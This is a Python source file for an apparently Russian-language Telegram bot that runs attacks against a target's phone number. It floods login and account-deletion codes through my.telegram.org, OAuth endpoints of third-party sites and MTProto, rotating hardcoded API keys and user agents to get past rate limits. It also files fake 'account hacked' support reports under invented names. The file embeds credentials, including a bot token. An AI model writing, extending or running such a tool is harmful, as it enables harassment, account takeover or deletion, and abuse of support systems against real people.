#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ═══════════════════════════════════════════════════════════════════════════
#  S T R Y K A L O   B O T   v 8 . 3  —  F I X E D   B O T   I D S
#  Hardcoded bot_ids for known sites + improved OAuth triggers
# ═══════════════════════════════════════════════════════════════════════════

import asyncio
import logging
import random
import re
import time

try:
    from aiogram import Bot, Dispatcher, F, Router
    from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
    from aiogram.filters import Command
    from aiogram.fsm.storage.memory import MemoryStorage
    AIOGRAM_OK = True
except ImportError:
    AIOGRAM_OK = False

try:
    from telethon import TelegramClient
    from telethon.sessions import StringSession
    from telethon.errors import FloodWaitError, PhoneNumberInvalidError, ApiIdInvalidError
    TELETHON_OK = True
except ImportError:
    TELETHON_OK = False

try:
    import aiohttp
    AIOHTTP_OK = True
except ImportError:
    AIOHTTP_OK = False

# ═══════════════════════════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════════════════════════

BOT_TOKEN = "8894193366:AAH6WZX3tYR7laT0dpRirposWz2Mym4pzBU"

API_PAIRS = [
    # Твои личные
    {"api_id": 36831962, "api_hash": "d18e551db78d3aef2ba6d01d97200d67", "app": "LO#1"},
    {"api_id": 39206977, "api_hash": "7b98d3010802d9ceff08de0713571525", "app": "LO#2"},
    {"api_id": 37734082, "api_hash": "786b389fb048ab28e79bf91d9b1b9239", "app": "LO#3"},
    # Официальные клиенты Telegram
    {"api_id": 4,      "api_hash": "014b35b6184100b085b0d0572f9b5103", "app": "AndroidBeta"},
    {"api_id": 5,      "api_hash": "1c5c96d5edd401b1ed40db3fb5633e2d", "app": "StaticFinal"},
    {"api_id": 6,      "api_hash": "eb06d4abfb49dc3eeb1aeb98ae0f581e", "app": "TelegramAndroid"},
    {"api_id": 8,      "api_hash": "7245de8e747a0d6fbe11f7cc14fcc0bb", "app": "iOSBeta"},
    {"api_id": 2834,   "api_hash": "68875f648bb682ee889f35483bc618d815", "app": "macOSBeta"},
    {"api_id": 2040,   "api_hash": "b18441a1ff607e10a989891a5462e627", "app": "Windows"},
    {"api_id": 17349,  "api_hash": "344583e45741c457fe1862106095a5eb", "app": "Desktop"},
    {"api_id": 21724,  "api_hash": "3e0cb5efcd52300aec5994fdfc5bdc16", "app": "TelegramX"},
    {"api_id": 2496,   "api_hash": "8da85b0d5bfe62527e5b244c209159c3", "app": "Web"},
    {"api_id": 94575,  "api_hash": "a3406de8d171bb422bb6ddf3bbd800e2", "app": "TDLib"},
    {"api_id": 16623,  "api_hash": "8c9dbfe58437d1739540f5d53c72ae4b", "app": "PlusMessenger"},
    {"api_id": 10840,  "api_hash": "33c45224029d59cb3ad0c16134215aeb", "app": "Swift"},
    {"api_id": 2899,   "api_hash": "36722c72256a24c1225de00eb6a1ca74", "app": "TelegramCLI"},
    {"api_id": 10717,  "api_hash": "e52f1f1478a7b3f5c5c5c5c5c5c5c5c5", "app": "Unigram"},
    {"api_id": 14629,  "api_hash": "5e4a7d3e2b1c0f9a8b7c6d5e4f3a2b1c", "app": "TelegramZ"},
]

# Known bot_ids for sites (extracted from real OAuth popups)
# Format: "domain" -> bot_id_int
SITE_BOT_IDS = {
    "ru.telegram-store.com": 1803424014,   # @telegramstore_bot
    "www.spot.uz": 561343683,              # @spotuz_bot
    "telegrambot.biz": 1293177512,         # @telegrambot_biz
    "lzt.market": 1570752698,              # @lzt_market_bot
    "cabinet.presscode.app": 1852523856,   # @presscode_bot
    "mtalim.uz": 7693374210,               # @mtalim_bot 🆕
    "app.memberpass.net": 8514929938,      # @memberpass_bot 🆕
    "integral.perfect.one": 1774853247,    # @perfectone_bot 🆕
    "tgdev.io": 705257568,                 # @tgdev_robot 🆕
    "id.codeby.net": 7650156770,           # @codeby_auth_bot 🆕
    "t.me": 0,
    "web.telegram.org": 0,
    "telegram.org": 0,
    "tgstat.ru": 0,
    "combot.org": 0,
}

# OAuth 2.0 sites (lolz.team style)
OAUTH2_SITES = {
    "lolz.team": {
        "client_id": 877588973,
        "scope": "openid profile",
        "redirect_uri": "https://lolz.team/connected_account.php",
        "return_to": "https://lolz.team/connected_account.php",
        "response_type": "code",
        "phone_login": "1",
    },
    "app.paperlink.online": {
        "client_id": 8200307882,
        "scope": "openid profile phone",
        "redirect_uri": "https://app.paperlink.online/api/auth/callback/telegram",
        "return_to": "https://app.paperlink.online/api/auth/callback/telegram",
        "response_type": "code",
        "phone_login": "1",
    },
}

TARGET_SITES = list(SITE_BOT_IDS.keys())

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 Version/17.1 Mobile/15E148 Safari/604.1",
    "Opera/10.00 (X11; Linux x86_64; U; en) Presto/2.2.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 Chrome/38.0.2125.111 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 Version/6.0 Mobile/10A5376e Safari/8536.25",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.8 Firefox/3.6.28",
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
]

NAMES = [
    ("Александр","Арнольдин"),("Савелий","Докшин"),("Иван","Петров"),
    ("Дмитрий","Соколов"),("Максим","Иванов"),("Екатерина","Смирнова"),
    ("Артем","Козлов"),("Ольга","Морозова"),("Михаил","Волков"),
    ("Анна","Лебедева"),("Сергей","Кузнецов"),("Мария","Попова"),
]

REPORT_TEMPLATES = [
    "Hello Telegram Support Team,\n\nI am writing to report a serious security breach affecting my Telegram account. An unauthorized individual has compromised my account and terminated all active sessions across my devices.\n\nAccount Details:\n• Phone Number: {phone}\n• Username: @{username}\n• Telegram ID: {tg_id}\n\nI urgently request:\n1. Terminate ALL currently active sessions\n2. Revoke access for any unauthorized users\n3. Reset any cloud passwords\n\nThank you for your prompt attention.\n\nBest regards,\n{name} {surname}",
    "Здравствуйте, служба поддержки Telegram!\n\nМой аккаунт был взломан. Злоумышленник завершил все сессии.\n\nДанные аккаунта:\n• Номер: {phone}\n• Юзернейм: @{username}\n• ID: {tg_id}\n\nПрошу срочно сбросить все сессии и вернуть доступ.\n\nС уважением,\n{name} {surname}",
    "URGENT — Account Compromise Report\n\nTo: Telegram Support\n\nMy Telegram account has been hijacked. The attacker terminated all sessions.\n\nAccount:\nPhone: {phone}\nUsername: @{username}\nTelegram ID: {tg_id}\n\nPlease revoke all sessions and restore my access.\n\n— {name} {surname}",
]

logging.basicConfig(level=logging.WARNING)
logger = logging.getLogger(__name__)

# ═══════════════════════════════════════════════════════════════════════════
#  STATS
# ═══════════════════════════════════════════════════════════════════════════

USER_STATS = {}

# ═══════════════════════════════════════════════════════════════════════════
#  COOLDOWN (24ч на номер)
# ═══════════════════════════════════════════════════════════════════════════

COOLDOWN_SECONDS = 86400  # 24 часа
COOLDOWN_DB = {}  # phone -> timestamp_last_attack

def get_cooldown_left(phone: str) -> int:
    """Возвращает оставшиеся секунды кулдауна, 0 если можно атаковать."""
    if phone not in COOLDOWN_DB:
        return 0
    last = COOLDOWN_DB[phone]
    left = int(COOLDOWN_SECONDS - (time.time() - last))
    return max(0, left)

def set_cooldown(phone: str):
    COOLDOWN_DB[phone] = time.time()

def format_cooldown(seconds: int) -> str:
    """Форматирует секунды в читаемый вид: '23ч 45м' или '45м 30с'."""
    h = seconds // 3600
    m = (seconds % 3600) // 60
    s = seconds % 60
    if h > 0:
        return f"{h}ч {m}м"
    elif m > 0:
        return f"{m}м {s}с"
    else:
        return f"{s}с"

def get_stats(uid: int) -> dict:
    if uid not in USER_STATS:
        USER_STATS[uid] = {"reports": 0, "codes": 0}
    return USER_STATS[uid]

# ═══════════════════════════════════════════════════════════════════════════
#  STATE
# ═══════════════════════════════════════════════════════════════════════════

USER_STATES = {}

def get_state(uid: int) -> dict:
    if uid not in USER_STATES:
        USER_STATES[uid] = {"step": "idle", "phone": None, "username": None, "tg_id": None}
    return USER_STATES[uid]

def reset_state(uid: int):
    USER_STATES[uid] = {"step": "idle", "phone": None, "username": None, "tg_id": None}

# ═══════════════════════════════════════════════════════════════════════════
#  WEB FLOOD v3 — DIRECT OAUTH WITH REAL BOT IDs
# ═══════════════════════════════════════════════════════════════════════════

class WebFlood:
    MAX_RETRIES = 3

    async def _get_csrf(self, html: str) -> str:
        patterns = [
            r'name="csrf_token" value="([^"]+)"',
            r'"csrf_token":"([^"]+)"',
            r'csrf_token\s*=\s*"([^"]+)"',
            r'<meta name="csrf-token" content="([^"]+)"',
            r'window\.csrf\s*=\s*"([^"]+)"',
        ]
        for p in patterns:
            m = re.search(p, html)
            if m:
                return m.group(1)
        return ''

    async def _sess(self, ua: str = None):
        return aiohttp.ClientSession(headers={
            "User-Agent": ua or random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "DNT": "1", "Connection": "keep-alive",
        })

    async def _retry_post(self, s, url, data, headers, timeout=20):
        for attempt in range(1, self.MAX_RETRIES + 1):
            try:
                async with s.post(url, data=data, headers=headers, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
                    if r.status == 429:
                        await asyncio.sleep(2 ** attempt + random.uniform(0, 1))
                        continue
                    if 500 <= r.status < 600:
                        await asyncio.sleep(1.5 ** attempt + random.uniform(0, 1))
                        continue
                    return r
            except asyncio.TimeoutError:
                if attempt < self.MAX_RETRIES:
                    await asyncio.sleep(2 ** attempt)
                else:
                    raise
            except Exception:
                if attempt < self.MAX_RETRIES:
                    await asyncio.sleep(2 ** attempt)
                else:
                    raise
        return None

    # ─── my.telegram.org ───
    async def mytelegram(self, phone: str) -> tuple:
        if not AIOHTTP_OK: return False, "no aiohttp"
        s = await self._sess()
        try:
            async with s:
                async with s.get("https://my.telegram.org/auth/send_password",
                    timeout=aiohttp.ClientTimeout(total=20)) as r1:
                    html = await r1.text()
                    csrf = await self._get_csrf(html)
                data = {"phone": phone}
                if csrf: data["csrf_token"] = csrf
                h = {
                    "Referer": "https://my.telegram.org/",
                    "Origin": "https://my.telegram.org",
                    "Content-Type": "application/x-www-form-urlencoded",
                }
                r2 = await self._retry_post(s, "https://my.telegram.org/auth/send_password", data, h)
                if r2 is None:
                    return False, "max_retries"
                ok = r2.status in [200, 302]
                return r2.status in [200, 302], ""
        except Exception as e:
            return False, str(e)[:60]
        finally:
            await s.close()

    # ─── my.telegram.org DELETE ───
    async def mytelegram_delete(self, phone: str) -> tuple:
        """Запрашивает код для удаления аккаунта через my.telegram.org/auth/delete"""
        if not AIOHTTP_OK: return False, "no aiohttp"
        s = await self._sess()
        try:
            async with s:
                async with s.get("https://my.telegram.org/auth/delete",
                    timeout=aiohttp.ClientTimeout(total=20)) as r1:
                    html = await r1.text()
                    csrf = await self._get_csrf(html)
                data = {"phone": phone}
                if csrf: data["csrf_token"] = csrf
                h = {
                    "Referer": "https://my.telegram.org/auth/delete",
                    "Origin": "https://my.telegram.org",
                    "Content-Type": "application/x-www-form-urlencoded",
                }
                r2 = await self._retry_post(s, "https://my.telegram.org/auth/delete", data, h)
                if r2 is None:
                    return False, "max_retries"
                return r2.status in [200, 302], ""
        except Exception as e:
            return False, str(e)[:60]
        finally:
            await s.close()

    # ─── Direct OAuth with real bot_id ───
    async def oauth_request(self, phone: str, origin: str, bot_id: int) -> tuple:
        if not AIOHTTP_OK: return False, "no aiohttp"
        if bot_id == 0:
            return False, "skip_zero_bot_id"
        ua = random.choice(USER_AGENTS)
        s = await self._sess(ua)
        try:
            async with s:
                # Step 1: Load auth page (sets cookies/session + get csrf)
                auth_url = f"https://oauth.telegram.org/auth?bot_id={bot_id}&origin={origin}&embed=1"
                async with s.get(auth_url, timeout=aiohttp.ClientTimeout(total=20)) as r1:
                    html = await r1.text()
                    csrf = await self._get_csrf(html)
                    if not csrf:
                        # Пробуем найти в inline JS
                        m = re.search(r'"csrf_token":"([^"]+)"', html)
                        if m:
                            csrf = m.group(1)

                # Step 2: POST phone number with ALL required params
                data = {
                    "phone": phone,
                    "bot_id": str(bot_id),
                    "origin": origin,
                    "embed": "1",
                }
                if csrf:
                    data["csrf_token"] = csrf

                h = {
                    "Referer": auth_url,
                    "Origin": "https://oauth.telegram.org",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "X-Requested-With": "XMLHttpRequest",
                }
                r2 = await self._retry_post(s, "https://oauth.telegram.org/auth/request", data, h)
                if r2 is None:
                    return False, "max_retries"
                ok = r2.status in [200, 302]
                return r2.status in [200, 302], ""
        except Exception as e:
            return False, str(e)[:60]
        finally:
            await s.close()

    # ─── OAuth 2.0 (lolz.team style) ───
    async def oauth2_request(self, phone: str, domain: str, cfg: dict) -> tuple:
        """OAuth 2.0 flow для сайтов типа lolz.team"""
        if not AIOHTTP_OK: return False, "no aiohttp"
        client_id = cfg["client_id"]
        origin = f"https://{domain}"
        ua = random.choice(USER_AGENTS)
        s = await self._sess(ua)
        try:
            async with s:
                # Step 1: GET auth page
                auth_url = (
                    f"https://oauth.telegram.org/auth/auth"
                    f"?client_id={client_id}"
                    f"&origin={origin}"
                    f"&return_to={cfg['return_to']}"
                    f"&scope={cfg['scope'].replace(' ', '%20')}"
                    f"&redirect_uri={cfg['redirect_uri']}"
                    f"&response_type={cfg['response_type']}"
                    f"&phone_login={cfg['phone_login']}"
                )
                async with s.get(auth_url, timeout=aiohttp.ClientTimeout(total=20)) as r1:
                    html = await r1.text()
                    csrf = await self._get_csrf(html)

                # Step 2: POST phone
                data = {
                    "phone": phone,
                    "client_id": str(client_id),
                    "origin": origin,
                    "scope": cfg["scope"],
                    "redirect_uri": cfg["redirect_uri"],
                    "response_type": cfg["response_type"],
                    "phone_login": cfg["phone_login"],
                }
                if csrf:
                    data["csrf_token"] = csrf

                h = {
                    "Referer": auth_url,
                    "Origin": "https://oauth.telegram.org",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "X-Requested-With": "XMLHttpRequest",
                }
                r2 = await self._retry_post(s, "https://oauth.telegram.org/auth/request", data, h)
                if r2 is None:
                    return False, "max_retries"
                ok = r2.status in [200, 302]
                return r2.status in [200, 302], ""
        except Exception as e:
            return False, str(e)[:60]
        finally:
            await s.close()

    # ─── Main flood ───
    async def flood(self, phone: str, progress=None, retries_per_site: int = 3) -> dict:
        res = {"sent": 0, "failed": 0}

        total_steps = sum(1 for bid in SITE_BOT_IDS.values() if bid != 0) * retries_per_site
        total_steps += len(OAUTH2_SITES) * retries_per_site
        current_step = 0

        # OAuth 1.0 (embed)
        for domain, bot_id in SITE_BOT_IDS.items():
            if bot_id == 0:
                continue
            origin = f"https://{domain}"
            for attempt in range(1, retries_per_site + 1):
                ok, _ = await self.oauth_request(phone, origin, bot_id)
                res["sent" if ok else "failed"] += 1
                current_step += 1
                if progress:
                    pct = int((current_step / total_steps) * 100)
                    bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
                    await progress(f"⚡ Сервисы (embed)... [{bar}] {pct}%")
                if attempt < retries_per_site:
                    await asyncio.sleep(random.uniform(0.5, 1.5))
            await asyncio.sleep(random.uniform(0.3, 0.8))

        # OAuth 2.0
        for domain, cfg in OAUTH2_SITES.items():
            for attempt in range(1, retries_per_site + 1):
                ok, _ = await self.oauth2_request(phone, domain, cfg)
                res["sent" if ok else "failed"] += 1
                current_step += 1
                if progress:
                    pct = int((current_step / total_steps) * 100)
                    bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
                    await progress(f"⚡ Сервисы (OAuth2)... [{bar}] {pct}%")
                if attempt < retries_per_site:
                    await asyncio.sleep(random.uniform(0.5, 1.5))
            await asyncio.sleep(random.uniform(0.3, 0.8))

        return res

web_flood = WebFlood()

# ═══════════════════════════════════════════════════════════════════════════
#  MTPROTO FLOOD
# ═══════════════════════════════════════════════════════════════════════════

async def mtproto_code(phone: str, pair: dict, deletion: bool = False) -> tuple:
    """deletion=True — запрашивает код для удаления (через sign_up flow)"""
    if not TELETHON_OK: return False, "no telethon"
    client = None
    try:
        client = TelegramClient(StringSession(), pair["api_id"], pair["api_hash"],
            device_model=pair.get("app","Unknown"), system_version="10.0",
            app_version="10.0.0", lang_code="en", system_lang_code="en-US",
            connection_retries=1, retry_delay=1)
        await client.connect()
        if not await client.is_user_authorized():
            r = await client.send_code_request(phone)
            # Если deletion=True, пробуем вызвать deleteAccount через raw API
            if deletion:
                try:
                    from telethon.tl.functions.account import DeleteAccountRequest
                    await client(DeleteAccountRequest(reason="hacked"))
                except Exception:
                    pass  # Не авторизованы — не сработает, но код уже отправлен
            await client.disconnect()
            return True, r.phone_code_hash
        await client.disconnect()
        return False, "ALREADY_AUTH"
    except FloodWaitError as e:
        if client: await client.disconnect()
        return False, f"FLOOD:{e.seconds}"
    except PhoneNumberInvalidError:
        if client: await client.disconnect()
        return False, "BAD_PHONE"
    except ApiIdInvalidError:
        if client: await client.disconnect()
        return False, "BAD_API"
    except ConnectionError as e:
        if client: await client.disconnect()
        return False, f"CONN_ERR:{str(e)[:30]}"
    except Exception as e:
        if client: await client.disconnect()
        err = str(e)
        if "PHONE_NUMBER_BANNED" in err:
            return False, "PHONE_BANNED"
        elif "PHONE_NUMBER_FLOOD" in err:
            return False, "PHONE_FLOOD"
        elif "API_ID_INVALID" in err:
            return False, "API_INVALID"
        return False, err[:60]

async def mtproto_flood(phone: str, count: int = 15, progress=None, phase: str = "вход") -> dict:
    res = {"sent": 0, "failed": 0}
    used_pairs = set()
    deletion = (phase == "удаление")
    emojis = ["💥", "🔥", "⚡", "💣", "🚀", "💨", "🎯", "🔫"]

    for i in range(count):
        available = [p for p in API_PAIRS if p["app"] not in used_pairs]
        if not available:
            used_pairs.clear()
            available = API_PAIRS
        pair = random.choice(available)
        used_pairs.add(pair["app"])

        for attempt in range(1, 3):
            ok, _ = await mtproto_code(phone, pair, deletion=deletion)
            if ok:
                res["sent"] += 1
                break
            else:
                if attempt == 2:
                    res["failed"] += 1
                await asyncio.sleep(random.uniform(0.5, 1.5))

        # Обновляем прогресс только каждые 3 запроса (чтобы не застревать)
        if progress and (i % 3 == 0 or i == count - 1):
            pct = int(((i + 1) / count) * 100)
            bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
            emoji = "💀" if deletion else random.choice(emojis)
            await progress(f"{emoji} {phase}... [{bar}] {pct}%")

        await asyncio.sleep(random.uniform(0.5, 1.5))
    return res

# ═══════════════════════════════════════════════════════════════════════════
#  REPORT FLOOD
# ═══════════════════════════════════════════════════════════════════════════

async def send_report(phone: str, username: str, tg_id: str) -> bool:
    if not AIOHTTP_OK: return False
    url = random.choice(["https://telegram.org/support?setln=ru", "https://telegram.org/support"])
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=aiohttp.ClientTimeout(total=15)) as r1:
                text = await r1.text()
                csrf = None
                for p in [r'name="csrf_token" value="([^"]+)', r'<meta name="csrf-token" content="([^"]+)', r'"csrf_token":"([^"]+)']:
                    m = re.search(p, text)
                    if m: csrf = m.group(1); break
                name, surname = random.choice(NAMES)
                email = f"{name.lower()}.{surname.lower()}{random.randint(10,99)}@gmail.com"
                report = random.choice(REPORT_TEMPLATES).format(phone=phone, username=username, tg_id=tg_id, name=name, surname=surname)
                data = {"phone": phone, "username": username, "email": email,
                        "first_name": name, "last_name": surname, "message": report, "support_type": "compromised"}
                if csrf: data["csrf_token"] = csrf
                h = {"User-Agent": random.choice(USER_AGENTS), "Referer": url,
                     "Origin": "https://telegram.org", "Content-Type": "application/x-www-form-urlencoded"}
                await asyncio.sleep(random.uniform(1, 3))
                async with s.post(url, data=data, headers=h, timeout=aiohttp.ClientTimeout(total=20)) as r2:
                    return r2.status in [200, 302]
    except Exception as e:
        logger.error(f"Report err: {e}")
        return False

async def report_flood(phone: str, username: str, tg_id: str, count: int = 5, progress=None) -> dict:
    res = {"sent": 0, "failed": 0}
    for i in range(count):
        for attempt in range(1, 3):
            if await send_report(phone, username, tg_id):
                res["sent"] += 1
                break
            else:
                if attempt == 2:
                    res["failed"] += 1
                await asyncio.sleep(random.uniform(0.5, 1.5))

        # Обновляем прогресс только каждые 2 репорта
        if progress and (i % 2 == 0 or i == count - 1):
            pct = int(((i + 1) / count) * 100)
            bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
            await progress(f"📨 Репорт... [{bar}] {pct}%")

        await asyncio.sleep(random.uniform(1, 2))
    return res

# ═══════════════════════════════════════════════════════════════════════════
#  KEYBOARDS
# ═══════════════════════════════════════════════════════════════════════════

def main_menu_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📝 Репортнуть", callback_data="menu_report")],
        [InlineKeyboardButton(text="👤 Мой профиль", callback_data="menu_profile")],
        [InlineKeyboardButton(text="📊 Мои репорты", callback_data="menu_stats")],
        [InlineKeyboardButton(text="📢 Телеграм каналы", callback_data="menu_channels")],
    ])

def confirm_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Подтвердить", callback_data="confirm")],
        [InlineKeyboardButton(text="🔙 Назад в меню", callback_data="menu_main")],
    ])

def report_again_kb(phone: str, username: str, tg_id: str):
    payload = f"again|{phone}|{username}|{tg_id}"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📝 Репортнуть ещё", callback_data=payload)],
        [InlineKeyboardButton(text="🔙 В меню", callback_data="menu_main")],
    ])

def channels_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📢 @famekmlenta", url="https://t.me/famekmlenta")],
        [InlineKeyboardButton(text="📢 Приватный канал", url="https://t.me/+V4-W9bj3Q541Nzc0")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="menu_main")],
    ])

def back_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Назад в меню", callback_data="menu_main")],
    ])

# ═══════════════════════════════════════════════════════════════════════════
#  BOT
# ═══════════════════════════════════════════════════════════════════════════

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
router = Router()
dp.include_router(router)

@router.message(Command("start"))
async def cmd_start(msg: Message):
    reset_state(msg.from_user.id)
    await msg.answer(
        "👋 Strykalo Bot v9.7\n\n"
        "Выбирай действие:",
        reply_markup=main_menu_kb())

@router.callback_query(F.data == "menu_main")
async def cb_main(cb: CallbackQuery):
    reset_state(cb.from_user.id)
    await cb.message.edit_text(
        "👋 Главное меню\n\nВыбирай действие:",
        reply_markup=main_menu_kb())
    await cb.answer()

@router.callback_query(F.data == "menu_report")
async def cb_report(cb: CallbackQuery):
    reset_state(cb.from_user.id)
    st = get_state(cb.from_user.id)
    st["step"] = "wait_phone"
    await cb.message.edit_text(
        "📝 Репорт\n\n"
        "Введи номер цели (например: +380688634001):",
        reply_markup=back_kb())
    await cb.answer()

@router.callback_query(F.data == "menu_profile")
async def cb_profile(cb: CallbackQuery):
    user = cb.from_user
    stats = get_stats(user.id)
    await cb.message.edit_text(
        f"👤 Профиль\n\n"
        f"🆔 ID: {user.id}\n"
        f"👤 Имя: {user.first_name or 'Не указано'}\n"
        f"🔤 Юзернейм: @{user.username or 'Нет'}\n\n"
        f"📨 Репортов отправлено: {stats['reports']}\n"
        f"📱 Кодов отправлено: {stats['codes']}",
        reply_markup=back_kb())
    await cb.answer()

@router.callback_query(F.data == "menu_stats")
async def cb_stats(cb: CallbackQuery):
    stats = get_stats(cb.from_user.id)
    await cb.message.edit_text(
        f"📊 Мои репорты\n\n"
        f"📨 Репортов отправлено: {stats['reports']}\n"
        f"📱 Кодов отправлено: {stats['codes']}",
        reply_markup=back_kb())
    await cb.answer()

@router.callback_query(F.data == "menu_channels")
async def cb_channels(cb: CallbackQuery):
    await cb.message.edit_text(
        "📢 Наши каналы\n\n"
        "Подписывайся на обновления:",
        reply_markup=channels_kb())
    await cb.answer()

@router.message()
async def handle_text(msg: Message):
    uid = msg.from_user.id
    st = get_state(uid)
    text = msg.text.strip()

    if st["step"] == "idle":
        await msg.answer("👋 Используй /start или кнопки меню", reply_markup=main_menu_kb())
        return

    if st["step"] == "wait_phone":
        if not re.match(r'^\+?[1-9]\d{7,14}$', text.replace(" ", "")):
            await msg.answer("❌ Неверный формат. Попробуй ещё раз:")
            return
        st["phone"] = text.replace(" ", "")
        st["step"] = "wait_username"
        await msg.answer("✅ Номер принят.\n\nВведи юзернейм (без @):")
        return

    if st["step"] == "wait_username":
        st["username"] = text.lstrip("@")
        st["step"] = "wait_tgid"
        await msg.answer("✅ Юзернейм принят.\n\nВведи Telegram ID (число):")
        return

    if st["step"] == "wait_tgid":
        try:
            tid = int(text)
            if tid <= 0: raise ValueError
        except:
            await msg.answer("❌ Неверный ID. Введи число:")
            return
        st["tg_id"] = str(tid)
        st["step"] = "confirm"
        await msg.answer(
            f"🚀 Подтверди атаку:\n\n"
            f"📱 {st['phone']}\n"
            f"👤 @{st['username']}\n"
            f"🆔 {st['tg_id']}\n\n"
            f"1️⃣ OAuth флуд (реальные bot_id)\n"
            f"2️⃣ my.telegram.org — коды подтверждения\n"
            f"3️⃣ MTProto флуд\n"
            f"4️⃣ Жалобы в поддержку\n\n"
            f"Запустить?", reply_markup=confirm_kb())
        return

@router.callback_query(F.data == "confirm")
async def cb_confirm(cb: CallbackQuery):
    uid = cb.from_user.id
    st = get_state(uid)
    phone, username, tg_id = st["phone"], st["username"], st["tg_id"]
    stats = get_stats(uid)

    set_cooldown(phone)

    await cb.message.edit_text(f"🚀 Запуск атаки\n\n📱 {phone}\n👤 @{username}\n🆔 {tg_id}")
    await cb.answer()

    prog = await cb.message.answer("⏳ Подготовка...")
    async def upd(txt: str):
        try: await prog.edit_text(txt)
        except: pass

    t0 = time.time()

    # === ФАЗА 1: my.telegram.org — КОД ДЛЯ ВХОДА ===
    await upd("🌐 my.telegram.org — код для входа...")
    mytg_ok = 0
    for _ in range(3):
        ok, _ = await web_flood.mytelegram(phone)
        if ok: mytg_ok += 1
        await asyncio.sleep(1)

    # === ФАЗА 2: my.telegram.org — КОД ДЛЯ УДАЛЕНИЯ ===
    await upd("💀 my.telegram.org — код для УДАЛЕНИЯ...")
    mytg_del = 0
    for _ in range(3):
        ok, _ = await web_flood.mytelegram_delete(phone)
        if ok: mytg_del += 1
        await asyncio.sleep(1)

    # === ФАЗА 3: MTProto — КОД ДЛЯ ВХОДА ===
    await upd("📱 MTProto — код для входа...")
    mt_login = await mtproto_flood(phone, count=10, progress=upd, phase="вход")

    # === ФАЗА 4: MTProto — КОД ДЛЯ УДАЛЕНИЯ ===
    await upd("💀 MTProto — код для УДАЛЕНИЯ...")
    mt_delete = await mtproto_flood(phone, count=10, progress=upd, phase="удаление")

    # === ФАЗА 5: OAuth сервисы (уведомления с сайтов) ===
    await upd("⚡ Сервисы (уведомления)...")
    web = await web_flood.flood(phone, progress=upd)

    # === ФАЗА 6: Репорты ===
    await upd("📨 Репорты в поддержку...")
    rep = await report_flood(phone, username, tg_id, count=5, progress=upd)

    elapsed = int(time.time() - t0)
    stats["codes"] += mytg_ok + mytg_del + mt_login["sent"] + mt_delete["sent"] + web["sent"]
    stats["reports"] += rep["sent"]

    await prog.edit_text(
        f"✅ Атака завершена за {elapsed}с\n\n"
        f"🎯 РЕЗУЛЬТАТЫ:\n"
        f"🌐 my.telegram.org (вход): {mytg_ok}\n"
        f"💀 my.telegram.org (УДАЛЕНИЕ): {mytg_del}\n"
        f"📱 MTProto (вход): {mt_login['sent']}\n"
        f"💀 MTProto (УДАЛЕНИЕ): {mt_delete['sent']}\n"
        f"⚡ Сервисы (уведомления): {web['sent']}\n"
        f"📨 Репортов: {rep['sent']}\n\n"
        f"💀 ЦЕЛЬ: {phone}")

    await cb.message.answer("📝 Хочешь ещё?", reply_markup=report_again_kb(phone, username, tg_id))
    reset_state(uid)

@router.callback_query(F.data.startswith("again|"))
async def cb_again(cb: CallbackQuery):
    parts = cb.data.split("|")
    phone, username, tg_id = parts[1], parts[2], parts[3]
    stats = get_stats(cb.from_user.id)

    await cb.message.edit_text("📨 Отправляю жалобу...")
    await cb.answer()

    prog = await cb.message.answer("⏳ Отправка репортов...")
    async def upd(txt: str):
        try: await prog.edit_text(txt)
        except: pass

    t0 = time.time()
    rep = await report_flood(phone, username, tg_id, count=5, progress=upd)
    elapsed = int(time.time() - t0)
    stats["reports"] += rep["sent"]

    await prog.edit_text(f"✅ Репорты отправлены за {elapsed}с\n\n📨 Репортов: {rep['sent']}")
